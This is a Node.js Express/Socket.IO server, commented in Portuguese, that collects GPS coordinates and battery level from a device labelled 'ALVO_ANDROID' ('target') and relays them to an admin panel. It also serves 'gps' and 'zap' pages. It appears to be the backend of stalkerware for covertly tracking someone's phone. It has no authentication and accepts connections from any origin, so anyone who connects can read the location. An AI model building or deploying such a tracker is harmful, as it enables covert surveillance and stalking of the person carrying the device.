const express = require('express');
const app = express();
const http = require('http').createServer(app);
const io = require('socket.io')(http, {
    cors: { origin: "*" } // Permite conexão de qualquer lugar
});
const path = require('path'); // <--- IMPORTANTE PARA O RENDER

// --- CONFIGURAÇÃO BLINDADA DE CAMINHOS ---
// Diz pro servidor exatamente onde estão as pastas, independente se é Windows ou Linux
app.use(express.static(path.join(__dirname, 'public')));
app.set('view engine', 'ejs');
app.set('views', path.join(__dirname, 'views'));

// --- ROTAS ---
app.get('/', (req, res) => res.render('home'));
app.get('/gps', (req, res) => res.render('gps'));
app.get('/zap', (req, res) => res.render('zap'));

// --- MEMÓRIA DO SERVIDOR ---
let lastKnownData = null;

io.on('connection', (socket) => {
    // Pega a "etiqueta" de quem conectou (se é Alvo ou Admin)
    const role = socket.handshake.query.role;

    if (role === 'target') {
        console.log(`[ALVO CONECTADO] ID: ${socket.id}`);
        
        socket.on('report_location', (data) => {
            lastKnownData = {
                deviceId: "ALVO_ANDROID",
                lat: data.lat,
                lng: data.lng,
                battery: data.battery,
                status: "ONLINE",
                timestamp: new Date().toLocaleTimeString()
            };
            
            // Envia para o Painel
            io.emit('gps_update', lastKnownData);
            console.log(`[GPS RECEBIDO] Lat: ${data.lat} | Lng: ${data.lng}`);
        });

        socket.on('disconnect', () => {
             console.log('[ALVO PERDIDO]');
             io.emit('target_status', { status: 'OFFLINE' });
        });

    } else {
        // Se for o Painel (Admin), envia a última posição logo de cara
        if (lastKnownData) {
            socket.emit('gps_update', lastKnownData);
        }
    }
});

// Porta automática do Render
const PORT = process.env.PORT || 3000;
http.listen(PORT, () => {
    console.log(`[SISTEMA] Rodando na porta ${PORT}`);
});